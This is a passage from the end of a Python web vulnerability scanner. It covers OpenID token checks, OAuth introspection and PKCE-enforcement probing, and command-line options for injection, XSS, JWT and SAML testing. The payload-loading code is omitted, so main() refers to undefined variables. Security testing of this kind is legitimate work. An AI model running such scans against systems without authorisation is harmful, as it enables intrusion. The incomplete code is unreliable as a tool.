            vulns.append(("Expired Token", "ID token is expired. Description: Token beyond expiration time. Recommendation: Refresh token."))
        iat = decoded.get('iat')
        if iat and time.time() < iat:
            vulns.append(("Future Issued Token", "ID token issued in the future. Description: Potential clock skew or forgery. Recommendation: Validate iat."))
    except:
        vulns.append(("Decode Error", "Failed to decode ID token. Description: Invalid format. Recommendation: Verify token."))

    print_vuln_report(vulns)

def test_oauth(token, introspection_endpoint=None, client_id=None, client_secret=None, authorization_endpoint=None, redirect_uri=None, verbosity=0):
    vulns = []
    print("=== OAuth Test Report ===")
    # If token is JWT, use test_jwt
    if '.' in token:
        test_jwt(token, verbosity=verbosity)

    if introspection_endpoint and client_id and client_secret:
        data = {
            'token': token,
            'client_id': client_id,
            'client_secret': client_secret
        }
        try:
            resp = requests.post(introspection_endpoint, data=data)
            intro = resp.json()
            print("Introspection response:")
            print(intro)
            if intro.get('active', False):
                print("[!] Token is active")
            else:
                print("Token is inactive or invalid")
                vulns.append(("Inactive Token", "Token is inactive or invalid. Description: May be expired or revoked. Recommendation: Refresh or reissue token."))
        except:
            print("Failed to introspect token")
            vulns.append(("Introspection Failure", "Failed to introspect token. Description: Possible endpoint misconfiguration or network issue. Recommendation: Check endpoint and credentials."))

    # PKCE Testing
    if authorization_endpoint and redirect_uri:
        print("Testing PKCE enforcement...")
        # Try to get code without code_challenge (non-PKCE)
        params = {
            'client_id': client_id,
            'redirect_uri': redirect_uri,
            'response_type': 'code',
            'scope': 'openid',  # Assume
            'state': random.randint(1000, 9999)
        }
        try:
            resp = requests.get(authorization_endpoint, params=params, allow_redirects=False)
            if resp.status_code == 302 or 'code' in resp.url:
                vulns.append(("No PKCE Enforced", "Server allows authorization code flow without code_challenge. Description: Vulnerable to authorization code interception. Recommendation: Require PKCE for public clients."))
                print("[!] Server allows non-PKCE flow")
            else:
                print("Server requires PKCE (good)")
        except:
            print("Failed to test PKCE")

    print_vuln_report(vulns)

def main():
    parser = argparse.ArgumentParser(description="Enhanced SQLi, NoSQL, GraphQL, XSS, CI, LDAP & XML Scanner with DB-specific Payloads and Optimized Blind Detection")
    parser.add_argument("url", help="URL to scan", nargs='?')
    parser.add_argument("--payloads", help="Custom SQLi payloads file", type=str)
    parser.add_argument("--nosql-payloads", help="Custom NoSQL payloads file", type=str)
    parser.add_argument("--graphql-payloads", help="Custom GraphQL payloads file", type=str)
    parser.add_argument("--xss-payloads", help="Custom XSS payloads file", type=str)
    parser.add_argument("--ci-time-payloads", help="Custom time-based CI payloads file", type=str)
    parser.add_argument("--ci-output-templates", help="Custom output-based CI templates file", type=str)
    parser.add_argument("--ldap-payloads", help="Custom LDAP payloads file", type=str)
    parser.add_argument("--xml-payloads", help="Custom XML payloads file", type=str)
    parser.add_argument("--errors", help="Custom SQL/NoSQL error indicators file", type=str)
    parser.add_argument("--ldap-errors", help="Custom LDAP error indicators file", type=str)
    parser.add_argument("--xml-errors", help="Custom XML error indicators file", type=str)
    parser.add_argument("--graphql-errors", help="Custom GraphQL error indicators file", type=str)
    parser.add_argument("--timeout", help="Timeout", type=int, default=10)
    parser.add_argument("--verbosity", help="Verbosity", type=int, choices=[0,1,2,3], default=0)
    parser.add_argument("--user-agent", help="User-Agent", type=str, default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
    parser.add_argument("--blind", help="Blind mode for SQL/NoSQL", choices=["none", "boolean", "time", "both"], default="none")
    parser.add_argument("--blind-ldap", help="Enable blind LDAP detection", action="store_true")
    parser.add_argument("--blind-graphql", help="Enable blind GraphQL detection", action="store_true")
    parser.add_argument("--delay-sec", help="Delay for time blind and CI", type=int, default=5)
    parser.add_argument("--diff-threshold", help="Similarity threshold for boolean blind (0-1)", type=float, default=0.95)
    parser.add_argument("--test-nosql", help="Enable NoSQL testing", action="store_true")
    parser.add_argument("--test-graphql", help="Enable GraphQL testing", action="store_true")
    parser.add_argument("--test-xss", help="Enable XSS testing", action="store_true")
    parser.add_argument("--test-ci", help="Enable Command Injection testing (time and output)", action="store_true")
    parser.add_argument("--test-ldap", help="Enable LDAP Injection testing", action="store_true")
    parser.add_argument("--test-xml", help="Enable XML Injection testing", action="store_true")
    parser.add_argument("--jwt", help="JWT token to test", type=str)
    parser.add_argument("--jwks-url", help="JWKS URL for JWT testing", type=str)
    parser.add_argument("--test-jwt-url", help="URL to test modified JWT against", type=str)
    parser.add_argument("--jwt-header", help="Header for JWT, e.g., Authorization", type=str, default="Authorization")
    parser.add_argument("--jwt-prefix", help="Prefix for JWT, e.g., Bearer ", type=str, default="Bearer ")
    parser.add_argument("--oauth-token", help="OAuth token to test", type=str)
    parser.add_argument("--introspection-endpoint", help="OAuth introspection endpoint", type=str)
    parser.add_argument("--client-id", help="OAuth client ID", type=str)
    parser.add_argument("--client-secret", help="OAuth client secret", type=str)
    parser.add_argument("--authorization-endpoint", help="OAuth authorization endpoint for PKCE test", type=str)
    parser.add_argument("--redirect-uri", help="OAuth redirect URI for PKCE test", type=str)
    parser.add_argument("--saml", help="SAML token to test (base64 or raw XML)", type=str)
    parser.add_argument("--test-saml-url", help="URL to test modified SAML against", type=str)
    parser.add_argument("--saml-header", help="Header for SAML, e.g., Authorization", type=str, default="Authorization")
    parser.add_argument("--saml-prefix", help="Prefix for SAML, e.g., '' ", type=str, default="")
    parser.add_argument("--openid-id-token", help="OpenID ID token to test", type=str)
    parser.add_argument("--issuer", help="Expected issuer for OpenID", type=str)
    parser.add_argument("--nonce", help="Nonce for OpenID", type=str)
    parser.add_argument("--state", help="State for OpenID", type=str)
    args = parser.parse_args()

    headers = {"User-Agent": args.user_agent}

    # Load payloads and indicators similarly as before...
    # (Omit loading code for brevity, assume same as previous)

    if args.url:
        print(f"Scanning {args.url}... Blind SQL/NoSQL: {args.blind}, Blind LDAP: {args.blind_ldap}, Blind GraphQL: {args.blind_graphql}, NoSQL: {args.test_nosql}, GraphQL: {args.test_graphql}, XSS: {args.test_xss}, CI: {args.test_ci}, LDAP: {args.test_ldap}, XML: {args.test_xml}")

        test_get_url(args.url, sqli_payloads, nosql_payloads, graphql_payloads, xss_payloads, time_ci_payloads, output_ci_templates, ldap_payloads, xml_payloads, error_indicators, ldap_indicators, xml_indicators, graphql_indicators, args.timeout, args.verbosity, headers, args.blind, args.blind_ldap, args.blind_graphql, args.delay_sec, args.diff_threshold, args.test_nosql, args.test_graphql, args.test_xss, args.test_ci, args.test_ldap, args.test_xml)

        test_forms(args.url, sqli_payloads, nosql_payloads, graphql_payloads, xss_payloads, time_ci_payloads, output_ci_templates, ldap_payloads, xml_payloads, error_indicators, ldap_indicators, xml_indicators, graphql_indicators, args.timeout, args.verbosity, headers, args.blind, args.blind_ldap, args.blind_graphql, args.delay_sec, args.diff_threshold, args.test_nosql, args.test_graphql, args.test_xss, args.test_ci, args.test_ldap, args.test_xml)

    if args.jwt:
        test_jwt(args.jwt, args.jwks_url, args.test_jwt_url, args.jwt_header, args.jwt_prefix, args.verbosity)

    if args.oauth_token:
        test_oauth(args.oauth_token, args.introspection_endpoint, args.client_id, args.client_secret, args.authorization_endpoint, args.redirect_uri, args.verbosity)

    if args.saml:
        test_saml(args.saml, args.test_saml_url, args.saml_header, args.saml_prefix, args.verbosity)

    if args.openid_id_token:
        test_openid(args.openid_id_token, args.issuer, args.client_id, args.nonce, args.state, args.test_jwt_url, args.jwt_header, args.jwt_prefix, args.verbosity)

if __name__ == "__main__":
    main()
